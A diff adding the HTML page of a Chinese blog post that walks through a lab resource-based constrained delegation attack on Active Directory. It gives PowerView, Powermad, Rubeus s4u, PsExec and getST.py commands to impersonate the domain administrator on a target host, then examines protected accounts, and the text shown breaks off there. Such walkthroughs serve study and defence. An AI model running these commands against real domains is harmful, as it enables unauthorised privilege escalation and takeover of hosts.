@@ -1,0 +1,607 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.4.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"antipassion.github.io","root":"/","scheme":"Pisces","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="基于资源的约束委派利用基于资源的约束委派，(Resource-based constrained delegation)，与前文提到的约束委派不同，它在信任的传递关系上是不同的，这也是它工作方向相反的一个因素。 在约束委派中，账户A到账户B的约束委派在账户A的 msDS-AllowedToDelegateTo 属性中配置，并且定义了A到B的传出信任,而在基于资源的约束委派当中，委派在账户B的msD">
+<meta property="og:type" content="article">
+<meta property="og:title" content="基于资源的约束委派">
+<meta property="og:url" content="http://antipassion.github.io/2022/01/30/%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE/index.html">
+<meta property="og:site_name" content="林中小屋">
+<meta property="og:description" content="基于资源的约束委派利用基于资源的约束委派，(Resource-based constrained delegation)，与前文提到的约束委派不同，它在信任的传递关系上是不同的，这也是它工作方向相反的一个因素。 在约束委派中，账户A到账户B的约束委派在账户A的 msDS-AllowedToDelegateTo 属性中配置，并且定义了A到B的传出信任,而在基于资源的约束委派当中，委派在账户B的msD">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://antipassion.github.io/images/%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE.assets/image-20220204202427514.png">
+<meta property="og:image" content="http://antipassion.github.io/images/%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE.assets/image-20220205171858248.png">
+<meta property="og:image" content="http://antipassion.github.io/images/%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE.assets/image-20220205172117772.png">
+<meta property="og:image" content="http://antipassion.github.io/images/%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE.assets/image-20220205172024597.png">
+<meta property="og:image" content="http://antipassion.github.io/images/%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE.assets/image-20220205172000776.png">
+<meta property="og:image" content="http://antipassion.github.io/images/%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE.assets/image-20220205172307352.png">
+<meta property="og:image" content="http://antipassion.github.io/images/%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE.assets/image-20220205172406926.png">
+<meta property="og:image" content="http://antipassion.github.io/images/%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE.assets/image-20220205172419960.png">
+<meta property="og:image" content="http://antipassion.github.io/images/%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE.assets/image-20220205172752065.png">
+<meta property="og:image" content="http://antipassion.github.io/images/%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE.assets/image-20220205172826093.png">
+<meta property="og:image" content="http://antipassion.github.io/images/%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE.assets/image-20220205172856256.png">
+<meta property="og:image" content="http://antipassion.github.io/images/%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE.assets/image-20220205173014453.png">
+<meta property="og:image" content="http://antipassion.github.io/images/%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE.assets/image-20220205173058335.png">
+<meta property="og:image" content="http://antipassion.github.io/images/%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE.assets/image-20220205182446385.png">
+<meta property="og:image" content="http://antipassion.github.io/images/%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE.assets/image-20220205204846994.png">
+<meta property="og:image" content="http://antipassion.github.io/images/%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE.assets/image-20220205205748570.png">
+<meta property="og:image" content="http://antipassion.github.io/images/%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE.assets/image-20220205210850607.png">
+<meta property="og:image" content="http://antipassion.github.io/images/%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE.assets/image-20220205211142165.png">
+<meta property="og:image" content="http://antipassion.github.io/images/%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE.assets/image-20220205213839675.png">
+<meta property="og:image" content="http://antipassion.github.io/images/%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE.assets/image-20220205214033038.png">
+<meta property="og:image" content="http://antipassion.github.io/images/%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE.assets/image-20220205214102004.png">
+<meta property="og:image" content="http://antipassion.github.io/images/%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE.assets/image-20220205225400564.png">
+<meta property="og:image" content="http://antipassion.github.io/images/%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE.assets/image-20220205225930436.png">
+<meta property="og:image" content="http://antipassion.github.io/images/%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE.assets/image-20220205233803496.png">
+<meta property="article:published_time" content="2022-01-30T04:44:17.000Z">
+<meta property="article:modified_time" content="2022-02-06T06:53:40.583Z">
+<meta property="article:author" content="Nayon">
+<meta property="article:tag" content="域渗透">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://antipassion.github.io/images/%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE.assets/image-20220204202427514.png">
+
+<link rel="canonical" href="http://antipassion.github.io/2022/01/30/%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>基于资源的约束委派 | 林中小屋</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+<link rel="alternate" href="/atom.xml" title="林中小屋" type="application/atom+xml">
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">林中小屋</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://antipassion.github.io/2022/01/30/%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/Nayon.png">
+      <meta itemprop="name" content="Nayon">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="林中小屋">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          基于资源的约束委派
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2022-01-30 12:44:17" itemprop="dateCreated datePublished" datetime="2022-01-30T12:44:17+08:00">2022-01-30</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2022-02-06 14:53:40" itemprop="dateModified" datetime="2022-02-06T14:53:40+08:00">2022-02-06</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E5%9F%9F%E6%B8%97%E9%80%8F/" itemprop="url" rel="index"><span itemprop="name">域渗透</span></a>
+                </span>
+            </span>
+
+          
+            <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h3 id="基于资源的约束委派利用"><a href="#基于资源的约束委派利用" class="headerlink" title="基于资源的约束委派利用"></a>基于资源的约束委派利用</h3><p>基于资源的约束委派，(Resource-based constrained delegation)，与前文提到的约束委派不同，它在信任的传递关系上是不同的，这也是它工作方向相反的一个因素。</p>
+<p>在约束委派中，账户A到账户B的约束委派在账户A的 msDS-AllowedToDelegateTo 属性中配置，并且定义了A到B的传出<code>信任</code>,而在基于资源的约束委派当中，委派在账户B的msDS-AllowedToActOnBehalfOfOtherIdentity 属性中配置，并定义了A到B的<code>传入</code>信任</p>
+<p><img src="/../images/%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE.assets/image-20220204202427514.png" alt="image-20220204202427514"></p>
+<p>如图为在Elad师傅中的文章中所得的导图，通过此图，我们可以看出基于资源的约束委派与传统约束委派的工作方式有何不同。</p>
+<p>在基于资源的约束委派当中，我们不需要再像传统的约束委派一样，通过域管理员权限，为用户设置相关的属性以便于请求相关服务，另一点就是传统的约束委派S4U2Self返回的票据，一定要是可转发的TGS（forwardableST），如果不可转发，在S4U2Proxy阶段将会代理用户请求服务失败；但在基于资源的约束委派当中，我们无需可转发的TGS票据（TrustedToAuthenticationForDelegation），通过操作S4U2Proxy也会成功执行，返回可转发ST。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">当我们获得用户对该主机的属性具有写权限时，那么这个用户便可以对该主机进行攻击了。</span><br></pre></td></tr></table></figure>
+
+<p>复现环境:</p>
+<ul>
+<li>域:attack.local</li>
+<li>域控主机:dc.attack.local，Windows Server 2012 R2 10.10.10.165</li>
+<li>目标主机:oa.attack.local，Windows Server 2012 R2 10.10.10.166</li>
+<li>用户: WebManager，对oa.attack.local主机具备写权限</li>
+</ul>
+<p>使用PowerView验证指定ACE，测试OA用户对win2016.attack.local主机是否具备写权限</p>
+<figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Get</span>-<span class="type">DomainUser</span> -<span class="type">Identity</span> <span class="type">WebManager</span> -<span class="type">Properties</span> objectsid</span><br><span class="line"><span class="title">wmic</span>:root\cli&gt;useraccount 获得域内用户的信息</span><br><span class="line"><span class="type">Get</span>-<span class="type">DomainObjectAcl</span> -<span class="type">Identity</span> oa | ?&#123;$_.<span class="type">SecurityIdentifier</span> -match <span class="string">&quot;S-1-5-21-4052809752-717748265-227546684-1601&quot;</span>&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../images/%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE.assets/image-20220205171858248.png" alt="image-20220205171858248"></p>
+<p>可以看到ActiveDirectoryRights 属性为GenericWrite ，即为对oa主机具有写权限，除去GenericWrite权限可利用外，还有<code>GenericAll</code>、<code>WriteProperty</code>、<code>WriteDacl</code>权限也是可以修改账户属性进行攻击利用的。</p>
+<p>拥有了可以修改计算机账户属性的帐号外，我们还需要一个SPN账户，这是因为S4U2Proxy在代替用户请求服务时，是根据Kerberos协议进行利用的，而SPN(服务主体名称)又是Kerberos客户端用于唯一标识给特定Kerberos目标计算机的服务实例名称。关于SPN更深层的利用在这里不再过多赘述，具体可以自行google或查看博客的<a href="https://antipassion.github.io/2021/09/27/Kerberoasting%E6%94%BB%E5%87%BB/">Kerberoasting攻击</a>，进行学习利用。</p>
+<p>在域当中，域用户默认在域内可创建的计算机账户数为10，而我们所创建的计算机账户，又默认注册在<code>RestrictedKrbHost/domain</code>、<code>HOST/domain</code>这两个SPN之下，此处我们正好可以进行利用。</p>
+<p>使用Powermad注册计算机用户 win2035</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">New-MachineAccount -MachineAccount WIN2035</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../images/%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE.assets/image-20220205172117772.png" alt="image-20220205172117772"></p>
+<figure class="highlight sas"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">setspn -q <span class="comment">*/* | findstr &quot;win2035&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/../images/%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE.assets/image-20220205172024597.png" alt="image-20220205172024597"></p>
+<p>通过Powermad脚本添加机器账户，查询spn发现SPN账户添加成功。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net group &quot;domain computers&quot; /domain</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../images/%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE.assets/image-20220205172000776.png" alt="image-20220205172000776"></p>
+<p>查询可知机器账户WIN2035$添加成功。</p>
+<p>对于<strong>修改oa计算机的msDS-AllowedToActOnBehalfOfOtherIdentity</strong>属性值,有两种方法。</p>
+<h4 id="1-利用Powerview脚本修改属性值"><a href="#1-利用Powerview脚本修改属性值" class="headerlink" title="1.利用Powerview脚本修改属性值"></a>1.利用Powerview脚本修改属性值</h4><p><strong>拿到查找新注册的机器账户SID</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Get-NetComputer -Identity WIN2035</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../images/%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE.assets/image-20220205172307352.png" alt="image-20220205172307352"></p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$SD</span> = <span class="built_in">New-Object</span> Security.AccessControl.RawSecurityDescriptor <span class="literal">-ArgumentList</span> <span class="string">&quot;O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;S-1-5-21-4052809752-717748265-227546684-2104)&quot;</span> <span class="comment">#此处为机器账户的sid</span></span><br><span class="line"><span class="variable">$SDBytes</span> = <span class="built_in">New-Object</span> byte[] (<span class="variable">$SD</span>.BinaryLength)</span><br><span class="line"><span class="variable">$SD</span>.GetBinaryForm(<span class="variable">$SDBytes</span>, <span class="number">0</span>)</span><br><span class="line"><span class="built_in">Get-DomainComputer</span> oa.attack.local| <span class="built_in">Set-DomainObject</span> <span class="literal">-Set</span> <span class="selector-tag">@</span>&#123;<span class="string">&#x27;msds-allowedtoactonbehalfofotheridentity&#x27;</span>=<span class="variable">$SDBytes</span>&#125; <span class="literal">-Verbose</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/../images/%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE.assets/image-20220205172406926.png" alt="image-20220205172406926"></p>
+<p><strong>验证是否修改成功</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Get-DomainComputer oa.attack.local -Properties msds-allowedtoactonbehalfofotheridentity</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../images/%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE.assets/image-20220205172419960.png" alt="image-20220205172419960"></p>
+<p>若msds-allowedtoactonbehalfofotheridentity存在值即为修改成功。</p>
+<p><strong>清除msds-allowedtoactonbehalfofotheridentity的值</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Set-DomainObject oa -Clear &#x27;msds-allowedtoactonbehalfofotheridentity&#x27; -Verbose</span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="2-通过ActiveDirectory模块修改其属性值"><a href="#2-通过ActiveDirectory模块修改其属性值" class="headerlink" title="2.通过ActiveDirectory模块修改其属性值"></a>2.通过ActiveDirectory模块修改其属性值</h4><p>[^注意：ActiveDirectory仅在Windows 2012及以上版本的服务器中存在<code>-PrincipalsAllowedToDelegateToAccount</code>选项，同时，本模块默认安装于域控当中，域内机器默认并不存在，需单独安装。]: </p>
+<p>若我们所打下来的域内主机不存在此模块，可通过上传dll powershell安装导入本模块进行利用</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Import-Module .\Microsoft.ActiveDirectory.Management.dll</span><br><span class="line">Set-ADComputer oa -PrincipalsAllowedToDelegateToAccount win2035$</span><br><span class="line">Get-ADComputer oa -Properties PrincipalsAllowedToDelegateToAccount</span><br></pre></td></tr></table></figure>
+
+<p>为了让测试更加直观明确，我们先利用Mimikatz将缓存的票据擦除</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Kerberos::purge</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../images/%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE.assets/image-20220205172752065.png" alt="image-20220205172752065"></p>
+<p>此时的WebManager用户，无法通过手中权限访问oa的共享目录</p>
+<p><img src="/../images/%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE.assets/image-20220205172826093.png" alt="image-20220205172826093"></p>
+<h4 id="利用Rubeus进行攻击"><a href="#利用Rubeus进行攻击" class="headerlink" title="利用Rubeus进行攻击"></a>利用Rubeus进行攻击</h4><p>由于Rubes不支持明文密码获得基于资源的约束委派票据，所以我们需要先将其转化为hash</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Rubeus.exe hash /user:WIN2035 /password:123456 /domain:attack.local</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../images/%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE.assets/image-20220205172856256.png" alt="image-20220205172856256"></p>
+<p>然后利用WIN2035$机器账户的rc4 hash请求ST并导入当前会话。</p>
+<figure class="highlight q"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Rubeus.exe s4u /user:WIN2035$ /rc4:<span class="number">32</span>ED87BDB5FDC5E9CBA88547376818D4  /impersonateuser:administrator /msdsspn:cifs/oa /ptt</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Rubeus.exe s4u /user:WIN2035$ /rc4:32ED87BDB5FDC5E9CBA88547376818D4  /impersonateuser:administrator /msdsspn:host/oa /ptt</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../images/%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE.assets/image-20220205173014453.png" alt="image-20220205173014453"></p>
+<p>此时利用本会话，访问oa机器的共享目录，成功</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dir \\oa\c$</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../images/%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE.assets/image-20220205173058335.png" alt="image-20220205173058335"></p>
+<h5 id="获得稳定的shell"><a href="#获得稳定的shell" class="headerlink" title="获得稳定的shell"></a>获得稳定的shell</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">PsExec64.exe \\oa cmd</span><br><span class="line">Python3 getSt.py -dc-ip 10.10.10.165 -spn cifs/oa -impersonate Administrator attack.local/attack:WIN2035:123456</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../images/%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE.assets/image-20220205182446385.png" alt="image-20220205182446385"></p>
+<h3 id="敏感账户不可被委派问题"><a href="#敏感账户不可被委派问题" class="headerlink" title="敏感账户不可被委派问题"></a>敏感账户不可被委派问题</h3><p>利用条件: 知道目标的机器账户的hash</p>
+<p>[^注：一般情况下主机在加入域中会随机设置机器账户的密码，所以一般情况下用的是机器账户hash,并且我们是不可以修改机器账户的密码。]: </p>
+<p>在域环境中，高权限用户如果没有特殊需求的话，考虑到安全性，一般会被设置为不可委派，或是加入受保护组。</p>
+<p><strong>设置账户不可委派</strong></p>
+<p><img src="/../images/%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE.assets/image-20220205204846994.png" alt="image-20220205204846994"></p>
+<p>此时我们再利用Rubeus申请票据，却发现S4U2Self步骤成功，但在S4U2Proxy代替用户去申请ST票据时失败,错误原因显示:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[X] KRB-ERROR (13) : KDC_ERR_BADOPTION</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Rubeus.exe s4u /user:WIN2035$ /rc4:32ED87BDB5FDC5E9CBA88547376818D4  /impersonateuser:administrator /msdsspn:host/oa /ptt</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../images/%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE.assets/image-20220205205748570.png"></p>
+<p>此处说明，当账户不可委派以及受保护组的成员可以完成S4U2Self，利用<code>Rubeus describe</code>查看返回的票据。</p>
+<p>将制作失败的S2U4Proxy阶段票据拿出去除空格换行符后利用Rubeus与成功生成利用的票据进行对比分析。</p>
+<p><img src="/../images/%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE.assets/image-20220205210850607.png" alt="image-20220205210850607"></p>
+<p><img src="/../images/%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE.assets/image-20220205211142165.png" alt="image-20220205211142165"></p>
+<p>可以发现，在<code>ServiceName</code>部分，被设置了敏感账户与被添加进受保护组的用户账号票据的ServiceName处的值为服务主机名，未被设置敏感账户与被添加进受保护组的用户账号票据的ServiceName处的值为请求的服务名。</p>
